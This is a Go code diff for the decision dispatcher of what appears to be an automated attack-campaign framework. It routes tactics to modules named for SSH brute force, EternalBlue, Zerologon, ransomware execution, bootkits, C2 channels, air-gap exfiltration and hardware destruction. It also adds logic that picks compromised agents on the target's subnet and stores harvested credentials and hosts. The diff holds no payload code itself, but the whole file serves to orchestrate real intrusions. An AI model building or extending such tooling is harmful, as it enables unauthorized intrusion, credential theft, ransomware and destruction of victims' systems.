@@ -2,7 +2,6 @@ package dispatch
 
 import (
 	"context"
-	"encoding/json"
 	"fmt"
 	"log"
 	"math/rand"
@@ -14,9 +13,9 @@ import (
 )
 
 type Dispatcher struct {
-	state       AppStateAccessor
-	log         *log.Logger
-	autoApprove bool
+	state         AppStateAccessor
+	log           *log.Logger
+	autoApprove   bool
 	minConfidence float64
 }
 
@@ -64,7 +63,7 @@ func (d *Dispatcher) DispatchDecision(ctx context.Context, campaign *types.Campa
 	d.log.Printf("Dispatching decision %s: %s/%s (conf=%.2f) for campaign %s",
 		decision.ID, decision.Tactic, decision.Technique, decision.Confidence, campaign.ID)
 
-	moduleName := d.mapTacticToModule(decision.Tactic, campaign)
+	moduleName := d.mapTacticToModule(decision.Tactic, decision.Technique, campaign)
 	if moduleName == "" {
 		d.log.Printf("No module mapped for tactic %s, advancing phase only", decision.Tactic)
 		d.advancePhase(campaign, decision)
@@ -142,7 +141,7 @@ func (d *Dispatcher) DispatchDecisionSync(ctx context.Context, campaign *types.C
 	d.log.Printf("Dispatching (sync) decision %s: %s/%s (conf=%.2f) for campaign %s",
 		decision.ID, decision.Tactic, decision.Technique, decision.Confidence, campaign.ID)
 
-	moduleName := d.mapTacticToModule(decision.Tactic, campaign)
+	moduleName := d.mapTacticToModule(decision.Tactic, decision.Technique, campaign)
 	if moduleName == "" {
 		return &DispatchResult{Success: false}, fmt.Errorf("no module for tactic %s", decision.Tactic)
 	}
@@ -206,43 +205,95 @@ func (d *Dispatcher) DispatchDecisionSync(ctx context.Context, campaign *types.C
 	return dr, nil
 }
 
-func (d *Dispatcher) mapTacticToModule(tactic string, campaign *types.Campaign) string {
+func (d *Dispatcher) mapTacticToModule(tactic, technique string, campaign *types.Campaign) string {
+	techLower := strings.ToLower(technique)
+
+	// Intelligent selection based on technique
+	if tactic == "Initial Access" || tactic == "Lateral Movement" {
+		if strings.Contains(techLower, "ssh") {
+			return "exploit/ssh_bruteforce"
+		}
+		if strings.Contains(techLower, "smb") || strings.Contains(techLower, "eternalblue") || strings.Contains(techLower, "ms17-010") {
+			return "exploit/eternalblue"
+		}
+	}
+	if tactic == "Privilege Escalation" {
+		if strings.Contains(techLower, "suid") {
+			return "exploit/privesc_suid"
+		}
+		if strings.Contains(techLower, "zerologon") {
+			return "exploit/zerologon"
+		}
+	}
+	if tactic == "Persistence" {
+		if strings.Contains(techLower, "cron") {
+			return "post/persist_cron"
+		}
+	}
+	if tactic == "Reconnaissance" {
+		return "recon"
+	}
+	if tactic == "Actions on Objective" {
+		if strings.Contains(techLower, "ransomware") || strings.Contains(techLower, "encrypt") {
+			return "ransomware/execute"
+		}
+	}
+
 	mappings := map[string][]string{
 		"Reconnaissance": {
 			"recon", "auxiliary/recon_osint", "v27/phishing_infra",
 			"v28/iot_identity_theft", "v26/cloud_nemesis",
+			"hydra/dns_rebinding", "rf_contagion/baseband",
 		},
 		"Initial Access": {
 			"exploit/ssh_bruteforce", "exploit/eternalblue", "v27/spear_phish_ai",
 			"v27/smishing_sms", "v28/fake_vulns", "v27/phishing_infra",
+			"hydra/cicd_webhooks", "hydra/usb_adb", "hydra/qr_worm",
+			"ai/deepfake_vishing", "hydra/powerline",
 		},
 		"Privilege Escalation": {
 			"exploit/privesc_suid", "exploit/zerologon", "v28/patchguard_bypass",
 			"v27/kernel_instrument", "v29/microcode_corrupt",
+			"evasion/byovd_loader", "evasion/dkom",
 		},
 		"Persistence": {
 			"post/persist_cron", "v26/bootkit_smm", "v27/uefi_bootkit",
 			"v27/hypervisor_ring1", "v29/nic_persist", "v29/intel_me_flash",
+			"evasion/wer_persistence", "evasion/blue_pill", "evasion/mft_slack",
 		},
 		"Command and Control": {
 			"v26/social_c2", "v26/cloud_nemesis", "v210/phantom_evasion",
 			"v28/cdn_injection", "v28/keyboard_led",
+			"c2/multi_channel", "c2/spiffe_mtls", "c2/ed25519",
+			"c2/kyber_hybrid", "c2/proto_obfuscate", "c2/dashboard_ops",
 		},
 		"Lateral Movement": {
 			"exploit/eternalblue", "ransomware/worm", "v29/network_ghosts",
 			"v28/isp_bgp", "blockz/firmware_worm",
+			"hydra/ultrasound", "hydra/vlan_jump", "hydra/pjl_worm",
+			"propagation/kerberos_del", "propagation/imdsv2_bypass",
 		},
 		"Collection": {
 			"ransomware/scan", "ransomware/identity_destroy",
 			"v28/iot_identity_theft", "v28/emotion_encrypt",
+			"ai/federated_learn",
 		},
 		"Exfiltration": {
 			"blockz/airgap_exfil", "v28/keyboard_led",
 			"v29/acoustic_resonance", "blockz/airgap_exfil",
+			"hydra/dns_rebinding",
 		},
 		"Actions on Objective": {
 			"ransomware/execute", "v210/apocalipsis", "v29/hdd_firmware_destroy",
 			"v29/vrm_overvoltage", "v29/usb_killer", "v29/digital_thermite",
+			"evasion/anti_forensics_adv", "propagation/chronos_ntp",
+		},
+		"Defense Evasion": {
+			"evasion/byovd_loader", "evasion/dkom", "evasion/anti_reversing",
+			"evasion/anti_forensics_adv", "evasion/wfp_dns_poison",
+			"evasion/lolbin_chainer", "evasion/wfp_kernel_dns",
+			"ai/jit_polymorphism", "loader/cross_platform",
+			"propagation/reflective_dll", "bridge/wazero",
 		},
 	}
 
@@ -260,16 +311,16 @@ func (d *Dispatcher) mapTacticToModule(tactic string, campaign *types.Campaign) 
 
 func mapModuleToBridgeFunction(moduleName string) string {
 	mapping := map[string]string{
-		"exploit/ssh_bruteforce":     "scan",
-		"post/persist_cron":          "execute",
-		"ransomware/scan":            "scan",
-		"ransomware/propagate":       "propagate",
-		"ransomware/encrypt":         "encrypt",
-		"ransomware/execute":         "execute",
-		"v26/pomdp_decide":           "pomdp_decide",
-		"v27/uefi_bootkit":           "uefi_bootkit",
-		"v29/hdd_firmware_destroy":   "hdd_firmware_destroy",
-		"v210/apocalipsis":           "apocalipsis",
+		"exploit/ssh_bruteforce":   "scan",
+		"post/persist_cron":        "execute",
+		"ransomware/scan":          "scan",
+		"ransomware/propagate":     "propagate",
+		"ransomware/encrypt":       "encrypt",
+		"ransomware/execute":       "execute",
+		"v26/pomdp_decide":         "pomdp_decide",
+		"v27/uefi_bootkit":         "uefi_bootkit",
+		"v29/hdd_firmware_destroy": "hdd_firmware_destroy",
+		"v210/apocalipsis":         "apocalipsis",
 	}
 
 	if fn, ok := mapping[moduleName]; ok {
@@ -286,6 +337,11 @@ func (d *Dispatcher) selectBestAgent(campaign *types.Campaign, decision *types.D
 
 	var best *types.Agent
 	bestScore := -1.0
+	targetSubnet := ""
+	if idx := strings.LastIndex(decision.Target, "."); idx != -1 {
+		targetSubnet = decision.Target[:idx+1]
+	}
+
 	for _, a := range agents {
 		score := 0.5
 		if strings.EqualFold(a.OS, "linux") || strings.EqualFold(a.OS, "windows") {
@@ -294,6 +350,15 @@ func (d *Dispatcher) selectBestAgent(campaign *types.Campaign, decision *types.D
 		if a.ID != "" {
 			score += 0.2
 		}
+		// Prefer agents on the same subnet as the target
+		if targetSubnet != "" && strings.HasPrefix(a.LocalIP, targetSubnet) {
+			score += 2.0
+		}
+		// Prioritize agents with active status
+		if a.Status == "active" || a.Status == "online" {
+			score += 1.0
+		}
+
 		if score > bestScore {
 			bestScore = score
 			best = a
@@ -349,59 +414,7 @@ func (d *Dispatcher) tryBridgeSync(ctx context.Context, moduleName string, decis
 }
 
 func (d *Dispatcher) processBridgeResult(result map[string]interface{}, decision *types.Decision, campaign *types.Campaign, moduleName string) {
-	if hosts, ok := result["new_hosts"]; ok {
-		if hostList, ok := hosts.([]interface{}); ok {
-			for _, h := range hostList {
-				if hm, ok := h.(map[string]interface{}); ok {
-					d.state.AddHost(&types.Target{
-						IP:       stringFromMap(hm, "ip"),
-						Hostname: stringFromMap(hm, "hostname"),
-						OS:       stringFromMap(hm, "os"),
-					})
-				}
-			}
-		}
-	}
-
-	if vulns, ok := result["new_vulnerabilities"]; ok {
-		if vulnList, ok := vulns.([]interface{}); ok {
-			for _, v := range vulnList {
-				if vm, ok := v.(map[string]interface{}); ok {
-					d.state.AddVulnerability(&types.Vulnerability{
-						CVE:         stringFromMap(vm, "cve"),
-						Description: stringFromMap(vm, "description"),
-						Severity:    stringFromMap(vm, "severity"),
-						Service:     stringFromMap(vm, "service"),
-						TargetIP:    decision.Target,
-					})
-				}
-			}
-		}
-	}
-
-	if creds, ok := result["new_credentials"]; ok {
-		if credList, ok := creds.([]interface{}); ok {
-			for _, c := range credList {
-				if cm, ok := c.(map[string]interface{}); ok {
-					d.state.AddCredential(&types.Credential{
-						Username: stringFromMap(cm, "username"),
-						Password: stringFromMap(cm, "password"),
-						Hash:     stringFromMap(cm, "hash"),
-						Domain:   stringFromMap(cm, "domain"),
-						Source:   moduleName,
-					})
-				}
-			}
-		}
-	}
-
-	if exploitOk, ok := result["exploit_succeeded"]; ok {
-		if succeeded, ok := exploitOk.(bool); ok && succeeded {
-			fromHost := d.inferSourceHost(campaign)
-			toHost := decision.Target
-			d.state.AddLateralEdge(fromHost, toHost, moduleName)
-		}
-	}
+	d.processBridgeResultInto(result, decision, campaign, moduleName, &DispatchResult{})
 }
 
 func (d *Dispatcher) processBridgeResultInto(result map[string]interface{}, decision *types.Decision, campaign *types.Campaign, moduleName string, dr *DispatchResult) {
@@ -555,10 +568,4 @@ func stringFromMap(m map[string]interface{}, key string) string {
 		}
 	}
 	return ""
-}
-
-func init() {
-	_, _ = json.Marshal(map[string]string{})
-	_ = fmt.Sprintf("%s", "dispatch")
-	_ = rand.Intn
 }
